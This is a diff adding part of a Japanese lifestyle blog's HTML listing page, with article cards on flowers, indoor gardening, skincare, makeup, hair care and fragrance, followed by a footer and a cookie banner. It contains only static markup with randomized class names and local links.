+                    <div class="xs-PWkPJttpAt"><img src="./img/99b13566cf26675d0f98b3f9edba3bb1a25ac424.jpg" class="section-CMPaKlhyAvuEVZPd" /></div>
+                    <div class="heading-JPKrfNtXXQhcy">
+                        <h5 class="row-gfvofEyPuRcJ">顕花植物の魅惑的な世界：自然の美しさのお祝い</h5>
+                        <div class="inner-leIzVxslYge"><span class="userpic-HOQXmr">さまざまな種類の顕花植物、それらの特徴、生態学的な役割、そして彼らが私たちの生活にもたらす喜びの詳細な調査。</span></div>
+                    </div>
+                </div>
+                <div class="narrow-iLvqaLfoL">
+                    <div class="row-vPjmEHoKI">
+                        <div class="button-qVzkRBpBebWqFCTk">
+                            <div class="big-kSyFIRRf"><span class="tip-UYkfSPLcgriYOkop">28 March 2025</span></div>
+                        </div>
+                        <div class="thumb-iaUFZVwMJyvwpyO">
+                            <div class="all-kLiFmxMIgB"><span class="md-FcxCBI">エミリー・カーター</span></div>
+                        </div>
+                    </div>
+                    <div class="section-kuKnoKqmFC"><a href="themelist3.html" class="avatar-YrvemkM"><span class="icon-HeXzdtEeipFMQVW">すべてを表示</span></a><a href="index.html" class="thumbnail-MCiwRL"><span class="caption-kyAFHwPgDDmAWJ">宣伝</span></a></div>
+                    <div class="control-dMVpFJFEYTZTKQri"><img src="./img/29a0f4258ec8f62a6625451937e0af2c1b387352.jpg" class="content-gKHXZd" /></div>
+                    <div class="heading-nQGvCsLrrEcNV">
+                        <h5 class="wrapper-yOjZEo">屋内ガーデニングの不思議：家で緑地を栽培する</h5>
+                        <div class="tooltip-fnIxUopA"><span class="tagline-bIFAgxmqwAoTf">屋内ガーデニングの探索、あなたの家の中で繁栄する植物環境を作成するための利点、技術、およびヒントを強調しています。</span></div>
+                    </div>
+                </div>
+                <div class="current-NpQGUTCzVmlIuno">
+                    <div class="section-HKEozJdwmekKJAEs">
+                        <div class="large-XkFDJypio">
+                            <div class="button-DecaUBCKhSfw"><span class="img-qPhsEHsuKTAtbo">04 December 2025</span></div>
+                        </div>
+                        <div class="xl-ZJGICSD">
+                            <div class="pic-WCgmVpr"><span class="title-kXHgsYi">クララ・トンプソン</span></div>
+                        </div>
+                    </div>
+                    <div class="preview-iHrpohJWtOZXUMm"><a href="themelist4.html" class="container-NSqYCmvwodegeB"><span class="heading-AlzBejqWoZt">すべてを表示</span></a><a href="index.html" class="container-yYLrsbAE"><span class="avatar-gZXnNnZlzpmr">宣伝</span></a></div>
+                    <div class="container-bUcMlFho"><img src="./img/2982eaf59b6774b9075f5cf1f66fc121a3dcd2d4.jpg" class="button-wGFQuLwk" /></div>
+                    <div class="large-cAhJVmBIfEPVjQtb">
+                        <h5 class="wide-xFeVjWRvnMnbPMsk">スキンケアにおける天然成分の利点を探る</h5>
+                        <div class="xl-LkHqIQgdzzgGsHn"><span class="avatar-GaBMsBFNmDbKwYDI">この記事では、スキンケアに天然成分を使用する利点を詳しく掘り下げ、人気のあるオプションとそれらがどのように肌の健康を高めることができるかを強調します。</span></div>
+                    </div>
+                </div>
+                <div class="caption-aJwKbIBIZT">
+                    <div class="grid-iJwCBfc">
+                        <div class="small-znuNxLkGZDuzgVa">
+                            <div class="avatar-IfOHvtBsYPnE"><span class="image-PwNpfPjhsMird">31 May 2025</span></div>
+                        </div>
+                        <div class="title-OVbFfrbI">
+                            <div class="current-GgcJAlhv"><span class="tip-PECzIGtxTJTjHQpv">ソフィー・マルティネス</span></div>
+                        </div>
+                    </div>
+                    <div class="breadcrumbs-GuVzuUOuJEkH"><a href="themelist5.html" class="all-uMFMZwcAo"><span class="tooltip-ZvfmyBKEZjPSqRBK">すべてを表示</span></a><a href="index.html" class="page-seykyRfQRH"><span class="md-qASITkkwPeaILoX">宣伝</span></a></div>
+                    <div class="tooltip-hjNeNSozXt"><img src="./img/23516c4e9f508005b46996c4ecbbb7b0bf42db11.jpg" class="md-cwwVddxXmeXMy" /></div>
+                    <div class="control-DHIBgTtGu">
+                        <h5 class="tip-KlfLFUAoDv">ミニマリストのメイクの芸術：少ないものはもっと多い</h5>
+                        <div class="column-BkmUSYw"><span class="tiny-qNlWvZIknXqFDGWj">この記事では、ミニマリストの構成の原則を探り、より少ない製品で新鮮で自然な外観を達成するためのヒントと製品の推奨事項を提供します。</span></div>
+                    </div>
+                </div>
+                <div class="subject-DPDGJr">
+                    <div class="section-LAcyVi">
+                        <div class="grid-GuDsUWqlcY">
+                            <div class="wrap-GZodBnwMGVNWE"><span class="column-NJjOkZOgCrWO">11 December 2024</span></div>
+                        </div>
+                        <div class="wrap-SEeuLXrgBvNSEJOv">
+                            <div class="desc-SnUqTZ"><span class="icon-ngSvubEiQ">リアム・フィッシャー</span></div>
+                        </div>
+                    </div>
+                    <div class="desc-HXxhIlBTCFwpYE"><a href="themelist6.html" class="small-VxgMSrijhngvJ"><span class="thumb-FCArtki">すべてを表示</span></a><a href="index.html" class="thumb-PxMIoaixMlf"><span class="headline-xhnkrNwqEcpzbZ">宣伝</span></a></div>
+                    <div class="subtitle-RhNyZutbkp"><img src="./img/0da32e7978330540c82286170089e2e2658940e9.jpg" class="thumbnail-ADeDFbZR" /></div>
+                    <div class="box-vEitMEVf">
+                        <h5 class="huge-iYcjAdQ">ヘアケアの芸術の習得：健康的なロックのための重要なヒント</h5>
+                        <div class="picture-LOhwaqxMCmuNCmng"><span class="lg-KCEDaRcAeTKgix">この記事では、美しく健康な髪を維持するための効果的なヘアケアの実践、製品、および技術に関する包括的なガイドを提供します。</span></div>
+                    </div>
+                </div>
+                <div class="image-oUoiGbAfaCgEiahN">
+                    <div class="heading-dBZDTbm">
+                        <div class="preview-ZywJfjlZMggLSAJ">
+                            <div class="picture-MuEkmNEkh"><span class="thumbnail-WexCVRy">27 August 2025</span></div>
+                        </div>
+                        <div class="col-igPEJbCBVsJONr">
+                            <div class="md-xJooJmYrZNVpKw"><span class="holder-QeXHlPpYD">ルーカス・ベネット</span></div>
+                        </div>
+                    </div>
+                    <div class="content-FvofXIiNtONEB"><a href="themelist7.html" class="picture-KWYzwnNrQyMeTDY"><span class="breadcrumbs-mnYRamChL">すべてを表示</span></a><a href="index.html" class="preview-cnOydDTBVQc"><span class="narrow-lqzJihKHOAcR">宣伝</span></a></div>
+                    <div class="tagline-zKmQbIYLIAjmy"><img src="./img/194e192ca346f3068b183003c41d5f6ecb4c005c.jpg" class="sm-DaycTcehlWxo" /></div>
+                    <div class="preview-iKyzPvzzKcEwO">
+                        <h5 class="page-qEtBUrKMWeN">香りの芸術：あなたの署名の香りを作り上げます</h5>
+                        <div class="active-KfVGREGrFNvzWXRa"><span class="tooltip-vcrVVKFiiTlnvcUH">この記事では、シグネチャーフレグランスを選択して作成し、重要な香りの体験のための重要なノート、個人的なスタイル、ヒントを探索する技術を掘り下げています。</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer class="column-xBCmxbYW">
+        <div class="box-HfIguDSsbqLlOZyP"><a href="./privacy_policy.html" class="preview-nQNjsFyDFqNqqwtW">Privacy Policy</a><a href="./terms_of_use.html" class="row-HyjUaPEzqrbLhj">Terms Of Use</a><a href="./cookie_policy.html" class="column-GHvgvflxqcdVST">Cookies Policy</a></div>
+    </footer>
+    <input type="checkbox" id="close" class="grid-RgZtsjwhlX" />
+    <section class="picture-lUSOBvzw">
+        <div class="xl-jkJFztv">
+            <div class="userpic-PinIle">
+                <label for="close" class="breadcrumbs-rpeMddfLsLOQc"><span class="section-wpbGUeFcyyRMwmQz">Cookieについての情報を入手する</span></label>
+            </div>
+            <div class="heading-ReNBckjoMsCxEN">
+                <label for="close" class="sm-pqKnZybMrvPU"><span class="thumb-LEqLZD">情報を入手</span></label>
+            </div>
+            <div class="headline-XLRtmUCBitaPldE">
+                <label for="close" class="xl-kpPNifB"><span class="lg-MRAcXJSbarJROiSV">すべてを認め</span></label>
+            </div>
+        </div>
+        <div class="xl-JegZLouTAVCSN"><span class="aside-fPdHkbFcXzUNEM">Cookiesポリシーを参照してください。このWebサイトではCookieを使用しています。<br> Cookieを使用して</span></div>
+    </section>
+</body>
+
 </html>
